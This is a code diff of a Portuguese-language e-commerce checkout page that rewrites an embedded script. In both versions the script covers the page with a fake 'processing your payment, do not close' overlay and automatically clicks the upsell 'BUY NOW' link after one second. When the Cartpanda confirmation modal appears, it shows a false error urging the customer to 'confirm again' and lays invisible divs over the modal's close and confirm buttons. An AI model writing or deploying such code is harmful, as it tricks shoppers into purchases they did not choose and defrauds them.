@@ -13,110 +13,113 @@
                 new OcuExternal();
                 </script>
             
-	<script>
-	document.addEventListener('DOMContentLoaded', () => {
-	  // 1) Injeta CSS do overlay
-	  const style = document.createElement('style');
-	  style.innerHTML = `
-		#customOverlay {
-		  position: fixed; top:0; left:0; width:100%; height:100%;
-		  background: rgba(255,255,255,0.95);
-		  z-index: 999999;
-		  display: flex; flex-direction: column;
-		  justify-content: center; align-items: center;
-		  text-align: center; font-family: Arial, sans-serif;
-		  pointer-events: auto;
-		}
-		#customOverlay .spinner {
-		  border:8px solid #f3f3f3; border-top:8px solid #3498db;
-		  border-radius:50%; width:60px; height:60px;
-		  animation: spin 1s linear infinite; margin-bottom:20px;
-		}
-		@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
-		#customOverlay .msg {
-		  font-size:1.2em; margin:5px 0;
-		}
-		#customOverlay .error {
-		  display: none;
-		  font-size:1.1em;
-		  margin-top:20px;
-		  pointer-events: none;
-		}
-	  `;
-	  document.head.appendChild(style);
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  // 1) CSS do overlay
+  const style = document.createElement('style');
+  style.innerHTML = `
+    #customOverlay {
+      position: fixed; top:0; left:0;
+      width:100%; height:100%;
+      background: rgba(255,255,255,0.95);
+      z-index: 999999;
+      display: flex; flex-direction: column;
+      justify-content: center; align-items: center;
+      text-align: center; font-family: Arial, sans-serif;
+      pointer-events: auto;
+    }
+    #customOverlay .spinner {
+      border:8px solid #f3f3f3;
+      border-top:8px solid #3498db;
+      border-radius:50%; width:60px; height:60px;
+      animation: spin 1s linear infinite; margin-bottom:20px;
+    }
+    @keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
+    #customOverlay .msg {
+      font-size:1.2em; margin:5px 0;
+    }
+    #customOverlay .error {
+      display: none;
+      font-size:1.1em;
+      margin-top:20px;
+    }
+    `;  
+  document.head.appendChild(style);
 
-	  // 2) Cria overlay
-	  const overlay = document.createElement('div');
-	  overlay.id = 'customOverlay';
-	  overlay.innerHTML = `
-		<div class="spinner"></div>
-		<div class="msg">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
-		<div class="msg">PROCESSANDO SEU PAGAMENTO</div>
-		<div class="error">
-		  HOUVE UM ERRO EM SEU PEDIDO,<br>
-		  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-		</div>
-	  `;
-	  document.body.appendChild(overlay);
+  // 2) Cria overlay full‐screen
+  const overlay = document.createElement('div');
+  overlay.id = 'customOverlay';
+  overlay.innerHTML = `
+    <div class="spinner"></div>
+    <div class="msg">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
+    <div class="msg">PROCESSANDO SEU PAGAMENTO</div>
+    <div class="error">
+      HOUVE UM ERRO EM SEU PEDIDO,<br>
+      CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
+    </div>
+  `;
+  document.body.appendChild(overlay);
 
-	  // 3) Após 1s, clica em BUY NOW
-	  setTimeout(() => {
-		const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (buy) buy.click();
-		else console.warn('Auto-upsell: botão BUY NOW não encontrado');
-	  }, 1000);
+  // 3) 1s depois, dispara BUY NOW
+  setTimeout(() => {
+    const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
+    if (buy) buy.click();
+    else console.warn('Auto-upsell: botão BUY NOW não encontrado');
+  }, 1000);
 
-	  // 4) Aguarda pela injeção do modal
-	  const obs = new MutationObserver((mutations, observer) => {
-		for (let m of mutations) {
-		  for (let node of m.addedNodes) {
-			if (node.nodeType === 1 && 
-			   (node.id === 'cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
-			  
-			  // 5.1) Esconde spinner/instruções e mostra erro
-			  overlay.querySelector('.spinner').style.display = 'none';
-			  overlay.querySelectorAll('.msg').forEach(el => el.style.display = 'none');
-			  overlay.querySelector('.error').style.display = 'block';
-			  // libera clicks para baixo
-			  overlay.style.pointerEvents = 'none';
+  // 4) Observa a injeção do modal
+  const obs = new MutationObserver((mutations, o) => {
+    for (const m of mutations) {
+      for (const node of m.addedNodes) {
+        if (node.nodeType===1 &&
+           (node.id==='cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
+          
+          // 5.1) Esconde spinner/mensagens, mostra erro
+          overlay.querySelector('.spinner').style.display = 'none';
+          overlay.querySelectorAll('.msg').forEach(el => el.style.display = 'none');
+          overlay.querySelector('.error').style.display = 'block';
+          // bloqueia overlay, mas permitimos que apenas os 'hotspots' passem o clique
+          overlay.style.pointerEvents = 'none';
 
-			  // 5.2) Sobrepõe dois divs transparentes exatamente sobre os botões
-			  ['#cartpanda-close-modal-btn','#cartpanda-payment-confirmation'].forEach(sel => {
-				const realBtn = document.querySelector(sel);
-				if (!realBtn) return;
-				const r = realBtn.getBoundingClientRect();
-				const cover = document.createElement('div');
-				Object.assign(cover.style, {
-				  position: 'fixed',
-				  top:    `${r.top}px`,
-				  left:   `${r.left}px`,
-				  width:  `${r.width}px`,
-				  height: `${r.height}px`,
-				  pointerEvents: 'none',
-				  background: 'rgba(0,0,0,0.1)',   /* sutil indicação visual */
-				  zIndex: 1000000
-				});
-				document.body.appendChild(cover);
-				// ajusta posição em caso de resize
-				window.addEventListener('resize', () => {
-				  const nr = realBtn.getBoundingClientRect();
-				  cover.style.top    = `${nr.top}px`;
-				  cover.style.left   = `${nr.left}px`;
-				  cover.style.width  = `${nr.width}px`;
-				  cover.style.height = `${nr.height}px`;
-				});
-			  });
+          // 5.2) Cria dois DIVs transparentes sobre os botões reais
+          ['#cartpanda-close-modal-btn','#cartpanda-payment-confirmation']
+            .forEach(sel => {
+              const real = document.querySelector(sel);
+              if (!real) return;
+              const r = real.getBoundingClientRect();
+              const ghost = document.createElement('div');
+              Object.assign(ghost.style, {
+                position: 'fixed',
+                top:    `${r.top}px`,
+                left:   `${r.left}px`,
+                width:  `${r.width}px`,
+                height: `${r.height}px`,
+                pointerEvents: 'none',
+                background: 'transparent',
+                zIndex: 1000000
+              });
+              overlay.appendChild(ghost);
+              // ajusta em resize
+              window.addEventListener('resize', () => {
+                const nr = real.getBoundingClientRect();
+                Object.assign(ghost.style, {
+                  top:    `${nr.top}px`,
+                  left:   `${nr.left}px`,
+                  width:  `${nr.width}px`,
+                  height: `${nr.height}px`
+                });
+              });
+            });
 
-			  observer.disconnect();
-			  return;
-			}
-		  }
-		}
-	  });
-
-	  obs.observe(document.body, { childList: true, subtree: true });
-	});
-	</script>
+          o.disconnect();
+          return;
+        }
+      }
+    }
+  });
+  obs.observe(document.body, { childList:true, subtree:true });
+});
+</script>
 
   <style>
     body {
